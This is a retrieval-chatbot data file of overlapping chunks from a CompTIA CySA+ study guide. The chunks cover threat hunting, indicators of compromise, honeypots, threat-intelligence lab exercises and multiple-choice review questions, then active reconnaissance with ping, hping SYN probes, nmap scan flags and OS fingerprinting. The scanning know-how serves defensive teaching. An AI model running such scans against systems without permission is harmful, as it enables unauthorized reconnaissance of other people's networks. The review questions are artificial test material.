rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to reduce your organization’s attack surface area, or you might find other ways to reduce the number of attack vectors available to attackers based on your threat analysis. Applying Threat Intelligence Organizationwide 149 Keys to this type of proactive activity are the use of integrated intelligence feeds from multiple sources, and improving your organization’s detection capabilities so that you can identity threats before they become a serious issue. You can think of proactive threat hunting as a process with steps that typically include: Establishing a Hypothesis A hypothesis is needed to test and should have actionable results based on the threat that the hypothesis considers. Profiling Threat Actors and Activities This helps ensure that you have considered who may be a threat, and why, as well as what their typical actions and processes are. Threat Hunting Tactics These are key to success in threat hunting activities. The skills, techniques, and procedures are where action meets analysis. Reducing the Attack Surface Area This allows resources to be focused on the remaining surface area, making protection more manageable. Bundling Critical Assets into Groups and Protection Zones This helps with managing attack surface area, threat hunting, and response activities, since each asset doesn’t need to be individually assessed or managed as a unique item. Understanding, Assessing, and Addressing Attack Vectors or the Means By Which an Attack Can Be Conducted This step must be based on analysis of threat actors and their techniques as well as the surface area that threat actors can target. You should know the difference between an organization’s attack surface, or the systems, services, and other elements of the organization that can be attacked and attack vectors, or how the attack can be accomplished. Integrated Intelligence better view of threats. This step combines multiple intelligence sources to provide a Improving Detection Capabilities This is a continuous process as threats improve their techniques and technology. If you do not improve your detection capabilities, new threats will bypass existing capabilities over time. As you prepare for the exam, make sure you consider how each of these plays a role in proactive threat hunting activities and what impact they would have in your organization. Focusing Your Threat Hunting As you prepare for the CySA+ exam, you’ll want to prepare for three major areas of focus for threat hunting that the exam outline calls out: ■■ Configurations and misconfigurations that may lead to compromise or that may indicate that an attacker has modified settings. 150 ■■ ■■ Chapter 4 ■ Threat Intelligence Isolated networks, which are typically used to protect sensitive or specialized data and systems. Threat hunting in isolated networks can be easier because traffic and behaviors should be all understood, but in some cases that also means that deploying and using centrally managed tools and capabilities can be more challenging. Business-­critical assets and processes are a focus area due to their importance. Threat hunters are likely to focus on these due to their organizational risk profile and the importance of ensuring
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	compromise or that may indicate that an attacker has modified settings. 150 ■■ ■■ Chapter 4 ■ Threat Intelligence Isolated networks, which are typically used to protect sensitive or specialized data and systems. Threat hunting in isolated networks can be easier because traffic and behaviors should be all understood, but in some cases that also means that deploying and using centrally managed tools and capabilities can be more challenging. Business-­critical assets and processes are a focus area due to their importance. Threat hunters are likely to focus on these due to their organizational risk profile and the importance of ensuring they remain secure. While these three areas are not the only three areas that organizations will focus on for threat hunting, you can expect them to be potential focus areas for the exam. Indicators of Compromise Indicators of compromise (IOCs) are data that is commonly associated with compromised systems and software. IOCs are used to detect breaches, compromises, and malware as well as other activities associated with attacks. The CySA+ exam outline looks at IOCs via three lenses: ■■ ■■ ■■ Collection, which focuses on how to acquire data that may indicate compromise. This typically focuses on using tools, logs, and other data sources to gather the data that may indicate compromises. Analysis is then needed to determine if the information gathered actually indicates a compromise. For example, unusual network traffic is a commonly cited IOC, but it may also simply be a new process or a user performing a rarely required task. Analysis requires understanding of what the data gathered means and contextual understanding of whether it is likely to mean a compromise has occurred or has been attempted. Application of IOCs occurs in two ways: first, through using analysis to understand if compromises have occurred, thus activating incident response processes and other security response procedures. IOC application can also be leveraged as part of the analysis process. Threat intelligence services and sharing groups document IOCs and make them available for security monitoring and analysis tools. As you approach the CySA+ exam, you should familiarize yourself with common IOCs types such as the following: ■■ Questionable login activity, including activity at odd hours, from dormant accounts, or from countries or geographic locations that don’t match typical account behavior ■■ Modifications to files, particularly configuration files and log files ■■ Unexpected or unusual use of privileged accounts ■■ Unusual or unexpected network traffic ■■ Large outbound data transfers ■■ Unexpected services, ports, or software running on systems or devices Summary 151 There are many other potential indicators of compromise, and you’re unlikely to be able to memorize every potential IOC. Instead you should focus on thinking about how you’d use IOC data, what you might look for given logs and other information, and how you’d apply them to determine if a compromise may have occurred. Threat Hunting Tools and Techniques Threat hunting requires investing in additional capabilities. One example that the CySA+ exam outline specifically mentions is active defense. Active
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	unexpected network traffic ■■ Large outbound data transfers ■■ Unexpected services, ports, or software running on systems or devices Summary 151 There are many other potential indicators of compromise, and you’re unlikely to be able to memorize every potential IOC. Instead you should focus on thinking about how you’d use IOC data, what you might look for given logs and other information, and how you’d apply them to determine if a compromise may have occurred. Threat Hunting Tools and Techniques Threat hunting requires investing in additional capabilities. One example that the CySA+ exam outline specifically mentions is active defense. Active defense may involve deception techniques that either delay or confuse attackers. Techniques like tarpits that provide attackers with large numbers of fake targets that both provide false data and slow down scans and attacks are common components in active defenses. There is a second definition of active defense that is used in some circumstances that can involve taking direct action against attackers. That can involve exploiting attack tools, “hack-­back” techniques, and similar activities. Due to the legal and liability issues that these techniques can create, active defense of this nature is often avoided and is unlikely to be covered by the CySA+ exam. Another element in some active defense schemes are honeypots. Honeypots are intentionally vulnerable systems that are used to lure attackers in. They’re instrumented and have logging enabled to allow threat analysts and other security professionals to review and analyze attacker and tool behaviors and techniques. In addition to traditional honeypots like those created by the Honeynet project (www.honeynet.org/projects), there are a wide variety of prebuilt honeypot tools designed around specific infrastructure and systems that may be attractive to attackers. Honeynets, or networks of honeypots, are sometimes used to replicate a more complex environment. Darknets, or pools of unused but monitored IP addresses, can also be used to help identify attack traffic and potential aggressors. Summary Understanding the threats that your organization faces is a critical part of your security program and operations. In order to understand those threats, as a security professional you should gather threat intelligence composed of data about your adversaries, their motivations, capabilities, tools, and methodologies. Open source threat intelligence is acquired from publicly available sources, and closed source threat intelligence is from commercial or other sources that do not make their data 152 Chapter 4 ■ Threat Intelligence available to the public. Both are used by many organizations as part of their threat intelligence efforts. Many open source threat intelligence sources exist, including government-­ sponsored feeds and sites, professional organizations, vendor resources, social media, and even information from individuals. Threat intelligence sharing can be useful throughout an organization’s security efforts, including for incident response, vulnerability management, detection, monitoring, and even security engineering. It is important to ensure that threat intelligence is reliable—­sources of threat intelligence need to be assessed, and the level of confidence you have in the data is important to know before you take actions based on it. Threat information also
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	are used by many organizations as part of their threat intelligence efforts. Many open source threat intelligence sources exist, including government-­ sponsored feeds and sites, professional organizations, vendor resources, social media, and even information from individuals. Threat intelligence sharing can be useful throughout an organization’s security efforts, including for incident response, vulnerability management, detection, monitoring, and even security engineering. It is important to ensure that threat intelligence is reliable—­sources of threat intelligence need to be assessed, and the level of confidence you have in the data is important to know before you take actions based on it. Threat information also needs to be managed, and standardized formats and languages for describing threat information exist to help make threat information more usable. STIX, ATT&CK, and other tools help to standardize threat information. They also help to classify threats using common terms like nation-­state actors and adversary capabilities. Threat actors are commonly classified into one of a handful of descriptions: nation-­state actors, advanced persistent threats (APTs), organized crime, hacktivists, insider threats—­both intentional and unintentional—­script kiddies, and supply chain threat actors. Understanding the type of threat actors you are facing is an important part of threat analysis. Threat hunting activities are driven by threat intelligence, and often relies on indicators of compromise (IOCs) to help identify attacks. Data is collected, analyzed and applied through the lens of IOCs in order for organizations to deal with threat actors and their actions. Understanding common IOCs is an important ability for security professionals. Exam Essentials Describe threats actors classification standards and common terms. Explain and differentiate types of threat actors, including advanced persistent threats (APTs), nation-­states, hacktivists, organized crime, script kiddies, and both intentional and unintentional insider threats. Understand why supply chain threats are increasingly considered by organizations as well. Describe tactics, techniques, and procedures. Explain TTP, or tactics, techniques, and procedures that are the behaviors of threat actors. Tactics are high-­level descriptions of how the threat actor behaves and what its strategies are. Techniques are the technical and nontechnical tools used to gain, maintain, and preserve access, to obtain information, and to perform other actions. Procedures are the processes threat actors use to sequence and leverage techniques to meet tactical and strategic goals. Understand how open and closed source intelligence is collected and where it is acquired. Describe both open source and closed source or proprietary threat intelligence sources. Understand that OSINT, or open source intelligence, can come from a variety of sources such as social media, blogs and forums, government bulletins, security organizations like CSIRTs and CERTs, and the dark web. Describe how intelligence sharing communities can provide threat data specifically targeted at industries or professional groups. Explain Lab Exercises 153 how to assess intelligence sources based on their timeliness, how relevant the data is to your needs, and how accurate the sources are by establishing confidence levels. Explain threat hunting and IOCs. Understand what indicators of compromise are and how they are gathered, analyzed, and applied. Explain common focus areas for threat hunters,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	intelligence, can come from a variety of sources such as social media, blogs and forums, government bulletins, security organizations like CSIRTs and CERTs, and the dark web. Describe how intelligence sharing communities can provide threat data specifically targeted at industries or professional groups. Explain Lab Exercises 153 how to assess intelligence sources based on their timeliness, how relevant the data is to your needs, and how accurate the sources are by establishing confidence levels. Explain threat hunting and IOCs. Understand what indicators of compromise are and how they are gathered, analyzed, and applied. Explain common focus areas for threat hunters, including configurations and misconfigurations, as well as why isolated networks are useful when instrumenting and monitoring for attacks. Describe why organizations focus on business-­critical assets and processes in their threat hunting prioritization. Explain active defense techniques, including honeypots. Lab Exercises Activity 4.1: Explore the AlienVault OTX In this exercise you will explore AlienVault’s Open Threat Exchange (OTX). Part 1: Create an account 1. Visit https://otx.alienvault.com and create an account. 2. Validate your account via email. 3. Log into OTX. Part 2: Review IOCs Now that you have access to the AlienVault OTX, you can review IOCs: 1. Choose Browse from the top menu. 2. Select Indicators from the submenu at the top of the screen. 3. Review the indicator types and roles to the left. 4. Select a role or indicator type, or both. Review the IOCs to understand how they are relevant to the role and indicator type. Select at least five to review. You may see URLs, hostnames, IP addresses, and other data. 5. Consider how you would use these IOCs in a feed. How would you leverage them? Are there methods you could use to avoid false positives? Activity 4.2: Set Up a STIX/TAXII Feed Now that you’ve seen what a feed may contain, you can set up an ongoing feed. Anomali’s STAXX community version provides an easy way to consume STIX feeds. In this exercise, you will download and install the STAXX client, and then review the data from one of the included feeds. 154 Chapter 4 ■ Threat Intelligence 1. Visit www.anomali.com/community/staxx and download the STAXX Community edition software. STAXX is a 1 GB download and requires an email to get the download link. 2. Install the STAXX client. You will need a virtualization environment like VirtualBox or VMware to open the OVA file. Follow the Anomali setup and installation guide at https://update.anomali.com/staxx/docs/Anomali_STAXX_Installation_ &_Administration_Guide.pdf. This guide will help you get Anomali set up. When you connect to the web interface, you will need to accept the insecure connection on most major browsers. 3. When asked, use the Anomali Limo service to gather data for your first feeds. 4. Once you are in and Anomali has ingested its feeds, explore the dashboards. What is the most common indicator type? Does it match what you would expect? 5. Advanced: Identify a STIX feed that isn’t part of the STAXX default feed list and add it to STAXX.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the Anomali setup and installation guide at https://update.anomali.com/staxx/docs/Anomali_STAXX_Installation_ &_Administration_Guide.pdf. This guide will help you get Anomali set up. When you connect to the web interface, you will need to accept the insecure connection on most major browsers. 3. When asked, use the Anomali Limo service to gather data for your first feeds. 4. Once you are in and Anomali has ingested its feeds, explore the dashboards. What is the most common indicator type? Does it match what you would expect? 5. Advanced: Identify a STIX feed that isn’t part of the STAXX default feed list and add it to STAXX. Activity 4.3: Intelligence Gathering Techniques Match each of the activities to the phase of the threat intelligence cycle where it fits. Requirements gathering Update requirements for your intelligence gathering program. Threat data collection Provide information about a threat to an IPS administrator. Threat data analysis Assess missing controls from a recent breach. Threat intelligence dissemination Download data via STIX. Gathering feedback Convert manually gathered threat data to STIX format. Review Questions 155 Review Questions 1. 2. 3. 4. 5. 6. Which of the following measures is not commonly used to assess threat intelligence? A. Timeliness B. Detail C. Accuracy D. Relevance Nandita has encountered an attacker who appears to be using a commonly available exploit package to attack her organization. The package seems to have been run with default configurations against her entire public-­facing Internet presence from a single system. What type of threat actor is she most likely facing? A. An APT B. A hacktivist C. A script kiddie D. A nation-­state actor Which of the following activities follows threat data analysis in the threat intelligence cycle? A. Gathering feedback B. Threat data collection C. Threat data review D. Threat intelligence dissemination Susan wants to start performing intelligence gathering. Which of the following options is frequently conducted in the requirements gathering stage? A. Review of security breaches or compromises your organization has faced B. Review of current vulnerability scans C. Review of current data handling standards D. Review of threat intelligence feeds for new threats What organizations did the U.S. government help create to help share knowledge between organizations in specific verticals? A. DHS B. SANS C. CERTs D. ISACs Which of the following threat actors typically has the greatest access to resources? A. Nation-­state actors B. Organized crime C. Hacktivists D. Insider threats Chapter 4 156 7. 8. 9. ■ Threat Intelligence Organizations like Anonymous, which target governments and businesses for political reasons, are examples of what type of threat actor? A. Hacktivists B. Military assets C. Nation-­state actors D. Organized crime Jason gathers threat intelligence that tells him that an adversary his organization considers a threat likes to use USB key drops to compromise their targets. What is this an example of? A. His organization’s attack surface B. A possible attack vector C. An example of adversary capability D. A probability assessment What type of assessment is particularly useful for identifying insider threats? A. Behavioral B. Instinctual
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	9. ■ Threat Intelligence Organizations like Anonymous, which target governments and businesses for political reasons, are examples of what type of threat actor? A. Hacktivists B. Military assets C. Nation-­state actors D. Organized crime Jason gathers threat intelligence that tells him that an adversary his organization considers a threat likes to use USB key drops to compromise their targets. What is this an example of? A. His organization’s attack surface B. A possible attack vector C. An example of adversary capability D. A probability assessment What type of assessment is particularly useful for identifying insider threats? A. Behavioral B. Instinctual C. Habitual D. IOCs 10. Felix want to gather threat intelligence about an organized crime threat actor. Where is he most likely to find information published by the threat actor ? A. Social media B. Blogs C. Government bulletins D. The dark web 11. Which of the following is not a common indicator of compromise? A. Administrative account logins B. Unexpected modifications of configuration files C. Login activity from atypical countries or locations D. Large outbound data transfers from administrative systems 12. Nick wants to analyze attacker tactics and techniques. What type of tool can he deploy to most effectively capture actual attack data for analysis? A. A firewall B. A honeypot C. A web application firewall D. A SIEM Review Questions 157 13. Which of the following is not a common focus area for threat hunting activities? A. Policies B. Misconfigurations C. Isolated networks D. Business-­critical assets 14. What term describes an analysis of threat information that might include details such as whether it is confirmed by multiple independent sources or has been directly confirmed? A. Threat quality level B. STIX level C. Confidence level D. Assurance level 15. What drove the creation of ISACs in the United States? A. Threat information sharing for infrastructure owners B. The Cybersecurity Act of 1994 C. Threat information collection network providers D. The 1998 ISAC Act 16. How is threat intelligence sharing most frequently used for vulnerability management? A. To identify zero-day threats before they are released B. As part of vulnerability feeds for scanning systems C. As part of patch management processes to determine which patches are not installed D. To perform quantitative risk assessment 17. OpenIOC uses a base set of indicators of compromise originally created and provided by which security company? A. Mandiant B. McAfee C. CrowdStrike D. Cisco 18. Advanced persistent threats are most commonly associated with which type of threat actor? A. Insider threats B. Nation-­state actors C. Organized crime D. Hacktivists Chapter 4 158 ■ Threat Intelligence 19. What are the two types of insider threats? A. Attack and defense B. Approved and prohibited C. Real and imagined D. Intentional and unintentional 20. Forensic data is most often used for what type of threat assessment data? A. STIX B. Behavioral C. IOCs D. TAXII Chapter 5 Reconnaissance and Intelligence Gathering THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 2.0: Vulnerability
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	18. Advanced persistent threats are most commonly associated with which type of threat actor? A. Insider threats B. Nation-­state actors C. Organized crime D. Hacktivists Chapter 4 158 ■ Threat Intelligence 19. What are the two types of insider threats? A. Attack and defense B. Approved and prohibited C. Real and imagined D. Intentional and unintentional 20. Forensic data is most often used for what type of threat assessment data? A. STIX B. Behavioral C. IOCs D. TAXII Chapter 5 Reconnaissance and Intelligence Gathering THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 2.0: Vulnerability Management ■■ 2.1 Given a scenario, implement vulnerability scanning methods and concepts ■■ 2.2 Given a scenario, analyze output from vulnerability assessment tools Security analysts, penetration testing professionals, vulnerability and threat analysts, and others who are tasked with understanding the security environment in which an organization operates need to know how to gather information. This process is called reconnaissance or intelligence gathering. Information gathering is often a requirement of information security standards and laws. For example, the Payment Card Industry Data Security Standard (PCI DSS) requires that organizations handling credit cards perform both internal and external network vulnerability scans at least quarterly and after any significant change. Gathering internal and external information about your own organization is typically considered a necessary part of understanding organizational risk, and implementing industry best practices to meet required due diligence requirements is likely to result in this type of work. In this chapter, you will explore active intelligence gathering, including port scanning tools and how you can determine a network’s topology from scan data. Then you will learn about passive intelligence gathering, including tools, techniques, and real-­world experiences, to help you understand your organization’s footprint. Finally, you will learn how to limit a potential attacker’s ability to gather information about your organization using the same techniques. This chapter focuses on vulnerability assessment in the context of reconnaissance and intelligence gathering. Domain 2.2’s vulnerability assessment material is also covered in Chapter 8, “Responding to Vulnerabilities,” where you’ll find the topics that aren’t covered in this chapter focused on vulnerability management. Mapping, Enumeration, and Asset Discovery The first step when gathering organizational intelligence is to identify an organization’s footprint. Host enumeration is used to create a map of an organization’s networks, systems, and other infrastructure. This is typically accomplished by combining information-­gathering tools with manual research to identify the networks and systems that an organization uses. Mapping, Enumeration, and Asset Discovery 161 Discovery processes are also often used as part of asset management, where they can be used for asset discovery. Even well-­managed organizations often find that devices have been moved between locations or have been added without proper process and authorization. Discovery processes, including asset discovery, which we discuss in the sidebar “Asset Discovery and Penetration Testing,” are commonly used to ensure that security professionals as well as system and network administrators know what is on their network. Asset Discovery and Penetration Testing Standards for
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to identify the networks and systems that an organization uses. Mapping, Enumeration, and Asset Discovery 161 Discovery processes are also often used as part of asset management, where they can be used for asset discovery. Even well-­managed organizations often find that devices have been moved between locations or have been added without proper process and authorization. Discovery processes, including asset discovery, which we discuss in the sidebar “Asset Discovery and Penetration Testing,” are commonly used to ensure that security professionals as well as system and network administrators know what is on their network. Asset Discovery and Penetration Testing Standards for penetration testing typically include enumeration and reconnaissance processes and guidelines. There are a number of publicly available resources, including the Open Source Security Testing Methodology Manual (OSSTMM), the Penetration Testing Execution Standard, and National Institute of Standards and Technology (NIST) Special Publication 800-­115, the Technical Guide to Information Security Testing and Assessment. ■■ ■■ OSSTMM: www.isecom.org/research.html Penetration Testing Execution Standard: www.pentest-­standard.org/index.php/ Main_Page ■■ SP 800-­115: http://csrc.nist.gov/publications/nistpubs/800-­115/ SP800-­115.pdf Active Reconnaissance Information gathered during enumeration exercises is typically used to provide the targets for active reconnaissance. Active reconnaissance uses host scanning tools to gather information about systems, services, and vulnerabilities. It is important to note that although reconnaissance does not involve exploitation, it can provide information about vulnerabilities that can be exploited. Permission and Executive Support Scanning a network or systems can cause problems for the devices that are scanned. Some services may not tolerate scan traffic well, whereas others may fill their logs or set off security alarms when scanned. This means you should make sure you have permission from the appropriate authorities in your organization before conducting active reconnaissance. You’ll likely hear approvals like this referred to as “Get out of jail free cards,” as they help to ensure that you won’t get into trouble for the scans. You may still want to touch 162 Chapter 5 ■ Reconnaissance and Intelligence Gathering (continued) base with system and network administrators to ensure that the scans don’t have an unintended impact. Scanning systems belonging to others may also be illegal without permission or may be prohibited by the terms of use of your Internet service provider. For example, some cloud computing platforms require users to complete a vulnerability or penetration testing request form before conducting scans using their infrastructure, and both apply limits to the types of systems and services that can be scanned. Mapping Networks and Discovering Topology Active scans can also provide information about network design and topology. As a scanning tool traverses a network range, it can assess information contained in the responses it receives. This can help a tester take an educated guess about the topology of the network based on the time to live (TTL) of the packets it receives, traceroute information, and responses from network and security devices. Figure 5.1 shows a scan using a tool called Zenmap, which provides a graphical user interface to the popular nmap network scanning tool. This scan shows a simple
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	be scanned. Mapping Networks and Discovering Topology Active scans can also provide information about network design and topology. As a scanning tool traverses a network range, it can assess information contained in the responses it receives. This can help a tester take an educated guess about the topology of the network based on the time to live (TTL) of the packets it receives, traceroute information, and responses from network and security devices. Figure 5.1 shows a scan using a tool called Zenmap, which provides a graphical user interface to the popular nmap network scanning tool. This scan shows a simple example network. Routers or gateways are centrally connected to hosts and allow you to easily see where a group of hosts connect. The system that nmap runs from becomes the center of the initial scan and shows its local loopback address, 127.0.0.1. A number of hosts appear on a second network segment behind the 10.0.2.1 router. Nmap (and Zenmap, using nmap) may not discover all systems and network devices—­firewalls or other security devices can stop scan traffic, resulting in missing systems or networks. FIGURE 5.1 Zenmap topology view Mapping, Enumeration, and Asset Discovery 163 When you are performing network discovery and mapping, it is important to lay out the systems that are discovered based on their network addresses and TTL. These data points can help you assess their relative position in the network. Of course, if you can get actual network diagrams, you will have a much more accurate view of the network design than scans may provide. The Zenmap graphical user interface to nmap includes a built-­in topology discovery tool that provides a visual representation of the scanned network. Remember that this is a best guess and isn’t necessarily a perfect match for the actual network. The topology information gathered by a scanning tool is likely to have flaws and may not match the actual design of the target network. Security and network devices can cause differences in the TTL and traceroute information, resulting in incorrect or missing data. Firewalls can also make devices and systems effectively invisible to scans, resulting in segments of the network not showing up in the topology built from scan results. In addition to challenges caused by security devices, you may have to account for variables, including differences between wired and wireless networks, virtual networks and virtual environments like VMware and Microsoft Hyper-­V, and of course on-­premises networks versus cloud-­hosted services and infrastructure. If you are scanning networks that you or your organization controls, you should be able to ensure that your scanning systems or devices are placed appropriately to gather the information that you need. If you are scanning as part of a penetration test or a zero-­knowledge test, you may need to review your data to ensure that these variables haven’t caused you to miss important information. Mapping and Scanning VMs and the Cloud Mapping networks, port scanning, service discovery, and many of the other techniques we discuss involve such variables as
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of course on-­premises networks versus cloud-­hosted services and infrastructure. If you are scanning networks that you or your organization controls, you should be able to ensure that your scanning systems or devices are placed appropriately to gather the information that you need. If you are scanning as part of a penetration test or a zero-­knowledge test, you may need to review your data to ensure that these variables haven’t caused you to miss important information. Mapping and Scanning VMs and the Cloud Mapping networks, port scanning, service discovery, and many of the other techniques we discuss involve such variables as whether the networks are wired or wireless, whether systems and network devices are virtual or physical, or whether the systems and services are on-­premises or in the cloud. This may mean that you need to use a tool that specifically targets wireless networks, or you may need to account for virtual systems that are not visible outside of a virtual host’s firewall. You may also have to handle a service differently, such as avoiding scanning a cloud service or system based on contracts or agreements. Remember to document what you know about the networks and systems you are scanning and to consider how they could impact both the data you gather and the techniques you use. Pinging Hosts The most basic form of discovery that you can conduct is pinging a network address. The ping command is a low-­level network command that sends a packet called an echo request to a remote IP address. If the remote system receives the request, it responds with an echo 164 Chapter 5 ■ Reconnaissance and Intelligence Gathering reply, indicating that it is up and running and that the communication path is valid. Ping communications take place using the Internet Control Message Protocol (ICMP). Here’s an example of an echo request sent to a server running on a local network: [~/]$ ping 172.31.48.137 PING 172.31.48.137 (172.31.48.137) 56(84) bytes of data. 64 bytes from 172.31.48.137: icmp_seq=1 ttl=255 time=0.016 ms 64 bytes from 172.31.48.137: icmp_seq=2 ttl=255 time=0.037 ms 64 bytes from 172.31.48.137: icmp_seq=3 ttl=255 time=0.026 ms 64 bytes from 172.31.48.137: icmp_seq=4 ttl=255 time=0.028 ms 64 bytes from 172.31.48.137: icmp_seq=5 ttl=255 time=0.026 ms 64 bytes from 172.31.48.137: icmp_seq=6 ttl=255 time=0.027 ms 64 bytes from 172.31.48.137: icmp_seq=7 ttl=255 time=0.027 ms -­-­-­ 172.31.48.137 ping statistics -­-­-­ 7 packets transmitted, 7 received, 0% packet loss, time 6142ms rtt min/avg/max/mdev = 0.016/0.026/0.037/0.008 ms In this case, a user used the ping command to query the status of a system located at 172.31.48.137 and received seven replies to the seven requests that were sent. It’s important to recognize that, while an echo reply from a remote host indicates that it is up and running, the lack of a response does not necessarily mean that the remote host is not active. Many firewalls block ping requests, and individual systems may be configured to ignore echo request packets. The hping utility is a more advanced version of the ping command that allows the customization
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	0.016/0.026/0.037/0.008 ms In this case, a user used the ping command to query the status of a system located at 172.31.48.137 and received seven replies to the seven requests that were sent. It’s important to recognize that, while an echo reply from a remote host indicates that it is up and running, the lack of a response does not necessarily mean that the remote host is not active. Many firewalls block ping requests, and individual systems may be configured to ignore echo request packets. The hping utility is a more advanced version of the ping command that allows the customization of echo requests in an effort to increase the likelihood of detection. hping can also be used to generate handcrafted packets as part of a penetration test. Here’s an example of the hping command in action: [~/]$ hping -­ p 80 -­ S 172.31.48.137 HPING 172.31.48.137 (eth0 172.31.48.137): S set, 40 headers + 0 data bytes. len=44 ip=172.31.48.137 ttl=45 DF id=0 sport=80 flags=SA seq=0 win-­ 29200 rtt=20.0ms len=44 ip=172.31.48.137 ttl=45 DF id=0 sport=80 flags=SA seq=1 win-­ 29200 rtt=19.7ms len=44 ip=172.31.48.137 ttl=45 DF id=0 sport=80 flags=SA seq=2 win-­ 29200 rtt=19.8ms len=44 ip=172.31.48.137 ttl=44 DF id=0 sport=80 flags=SA seq=3 win-­ 29200 rtt=20.1ms len=44 ip=172.31.48.137 ttl=46 DF id=0 sport=80 flags=SA seq=4 win-­ 29200 rtt=20.2ms len=44 ip=172.31.48.137 ttl=45 DF id=0 sport=80 flags=SA seq=5 win-­ 29200 rtt=20.5ms len=44 ip=172.31.48.137 ttl=46 DF id=0 sport=80 flags=SA seq=6 win-­ 29200 rtt=20.2ms Mapping, Enumeration, and Asset Discovery 165 ^C -­-­-­ 172.31.48.137 hping statistic -­-­-­ 26 packets transmitted, 26 packets received, 0% packet loss Round-­ trip min/avg/max = 19.2/20.0/20.8 In this command, the -­p 80 flag was used to specify that the probes should take place using TCP port 80. This port is a useful choice because it is used to host web servers. The -­S flag indicates that the TCP SYN flag should be set, indicating a request to open a connection. Any remote target running an HTTP web server would be likely to respond to this request because it is indistinguishable from a legitimate web connection request. The ping command is included by default on all major operating systems. hping, on the other hand, is a separate utility that must be installed. You can download the hping source code from wiki .hping.org. Port Scanning and Service Discovery Techniques and Tools Port scanning tools are designed to send traffic to remote systems and then gather responses that provide information about the systems and the services they provide. They are one of the most frequently used tools when gathering information about a network and the devices that are connected to it. Because of this, port scans are often the first step in an active reconnaissance of an organization. Port scanners have a number of common features, including the following: ■■ Host discovery ■■ Port scanning and service identification ■■ Device fingerprinting ■■ Service version identification ■■ Operating system identification Ports Scanners: A Handy Swiss Army Knife These capabilities also mean that port scanners are useful for network inventory tasks, security
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	about the systems and the services they provide. They are one of the most frequently used tools when gathering information about a network and the devices that are connected to it. Because of this, port scans are often the first step in an active reconnaissance of an organization. Port scanners have a number of common features, including the following: ■■ Host discovery ■■ Port scanning and service identification ■■ Device fingerprinting ■■ Service version identification ■■ Operating system identification Ports Scanners: A Handy Swiss Army Knife These capabilities also mean that port scanners are useful for network inventory tasks, security audits to identify new systems and services, and of course testing security devices and systems by sending scanning traffic for them to alert on. Integrating a port scanner into your toolkit (and scripting it!) can be a powerful tool. 166 Chapter 5 ■ Reconnaissance and Intelligence Gathering An important part of port scanning is an understanding of common ports and services. Ports 0–1023 are referred to as well-­known ports or system ports, but there are quite a few higher ports that are commonly of interest when conducting port scanning. Ports ranging from 1024 to 49151 are registered ports and are assigned by the Internet Assigned Numbers Authority (IANA) when requested. Many are also used arbitrarily for services. Since ports can be manually assigned, simply assuming that a service running on a given port matches the common usage isn’t always a good idea. In particular, many SSH and HTTP/HTTPS servers are run on alternate ports, either to allow multiple web services to have unique ports or to avoid port scanning that only targets their normal port. Analysis of scan data can be an art, but basic knowledge of how to read a scan is quite useful since scans can provide information about what hosts are on a network, what services they are running, and clues about whether they are vulnerable to attacks. In Figure 5.2, a vulnerable Linux system with a wide range of services available has been scanned. To read this scan, you can start at the top with the command used to run it. The nmap port scanner (which we will discuss in more depth in a few pages) was run with the -­O option, resulting in an attempt at operating system identification. The -­P0 flag tells nmap to skip pinging the system before scanning, and the -­sS flag performed a TCP SYN scan, which sends connection attempts to each port. Finally, we see the IP address of the remote system. By default, nmap scans 1,000 common ports, and nmap discovered 23 open ports out of that list. FIGURE 5.2 Nmap scan results Mapping, Enumeration, and Asset Discovery 167 Next, the scan shows us the ports it found open, whether they are TCP or UDP, their state (which can be open if the service is accessible, closed if it is not, or filtered if there is a firewall or similar protection in place), and its guess about what service
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	performed a TCP SYN scan, which sends connection attempts to each port. Finally, we see the IP address of the remote system. By default, nmap scans 1,000 common ports, and nmap discovered 23 open ports out of that list. FIGURE 5.2 Nmap scan results Mapping, Enumeration, and Asset Discovery 167 Next, the scan shows us the ports it found open, whether they are TCP or UDP, their state (which can be open if the service is accessible, closed if it is not, or filtered if there is a firewall or similar protection in place), and its guess about what service the port is. Nmap service identification can be wrong—­it’s not as full featured as some vulnerability scanners, but the service list is a useful starting place. Finally, after we see our services listed, we get the MAC address—­in this case, indicating that the system is running as a VM under Oracle’s VirtualBox virtualization tool and that it is running a 2.6 Linux kernel. This kernel is quite old and reached its end-­of-­life support date in February 2016, meaning that it’s likely to be vulnerable. The final things to note about this scan are the time it took to run and how many hops there are to the host. This scan completed in less than two seconds, which tells us that the host responded quickly and that the host was only one hop away—­it was directly accessible from the scanning host. A more complex network path will show more hops, and scanning more hosts or additional security on the system or between the scanner and the remote target can slow things down. The viewpoint of active reconnaissance can make a big difference in the data gathered. Internal scans from a trusted system or network will typically provide much more information than an external scan of a well-­secured network. If you are attempting to replicate a specific scenario, such as scanning by an external attacker, who has no access to an internal system, your scanning viewpoint should match. OS and Device Fingerprinting The ability to identify an operating system based on the network traffic that it sends is known as operating system fingerprinting, and it can provide useful information when performing reconnaissance. This is typically done using TCP/IP stack fingerprinting techniques that focus on comparing responses to TCP and UDP packets sent to remote hosts. Differences in how operating systems and even operating system versions respond, what TCP options they support, what order they send packets in, and a host of other details can provide a good guess at what OS the remote system is running. Device fingerprinting in this context describes the collection and correlation of information about a device like the software, services, and operating system it runs that allows it to be 